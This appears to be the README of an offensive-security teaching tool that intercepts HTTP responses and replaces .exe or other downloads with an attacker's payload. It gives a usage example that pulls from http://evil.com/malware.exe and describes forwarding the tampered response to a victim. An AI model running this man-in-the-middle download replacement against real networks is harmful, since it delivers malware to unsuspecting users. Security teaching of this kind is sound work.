
# Replace Downloads Tool

The **Replace Downloads Tool** is a Python script designed for intercepting HTTP responses and replacing requested file downloads with a specified file or URL. This tool can be used for educational purposes and ethical hacking scenarios to demonstrate the potential security risks of downloading files from untrusted sources.

**Disclaimer:** This tool should only be used for educational purposes and with proper authorization. Unauthorized use is strictly prohibited.

## Features

- Intercepts HTTP responses containing requested file downloads.
- Replaces the requested file with a specified file or URL.
- Can be used for educational purposes and ethical hacking teaching.

## Prerequisites

Ensure you have the following prerequisites installed on your system:

- Python 3
- Required Python libraries: `argparse`, `subprocess`, `sys`, `time`, `functools`, `netfilterqueue`, `scapy`, `colorama`, `halo`

## Usage

### Installation

1. Clone the repository or download the `replace_downloads.py` file to your local machine.
    
2. Open a terminal and navigate to the directory containing the script.
    
3. Install the required dependencies by running:
 ```bash
pip install -r requirements.txt
```


### Execution

Execute the script using the following command:
```bash
python replace_downloads.py -l <local_mode> -i <interface> -x <file_extension> --payload <replacement_file_or_url> --port <listening_port>
```

- `<local_mode>`: Use `-l` or `--local` if you are testing on your local machine or when using [bettercap].
    
- `<interface>`: The network interface you want to use in the attack.
    
- `<file_extension>`: The file extension of the file you want to replace in the response (e.g., `.exe`, `.zip`).
    
- `--payload`: The payload you want to inject, which can be a file path or a URL.
    
- `--port`: The port number on which you will listen and transmit packets (e.g., `8080` if you are using [bettercap]).
    

**Important:** This tool requires root privileges to manipulate network packets, so ensure that you run it with appropriate permissions.

### Example
```bash
python replace_downloads.py -l -i eth0 -x .exe --payload http://evil.com/malware.exe --port 8080
```

### Workflow

1. The tool intercepts HTTP responses containing requested file downloads.
    
2. It identifies the requested file based on the provided file extension.
    
3. The requested file is replaced with the specified payload (file or URL).
    
4. The modified response is forwarded to the victim's machine.
    

## Important Note

This tool should only be used for educational purposes and with proper authorization. Unauthorized use is strictly prohibited. The developer is not responsible for any misuse or damage caused by this tool.


## See Also

- [ARP Spoofing Tool](https://github.com/Saalehh/Networks-Penetration-Testing/tree/main/ARP%20Spoofing%20Tool "ARP Spoofing Tool")
- [ARP Spoofing Detection Tool](https://github.com/Saalehh/Networks-Penetration-Testing/tree/main/ARP%20Spoofing%20Detection%20Tool)
- [DNS Spoofing Tool](https://github.com/Saalehh/Networks-Penetration-Testing/tree/main/DNS%20Spoofing%20Tool)
- [HTTP Packet Sniffing Tool](https://github.com/Saalehh/Networks-Penetration-Testing/tree/main/HTTP%20Packet%20Sniffing%20Tool)

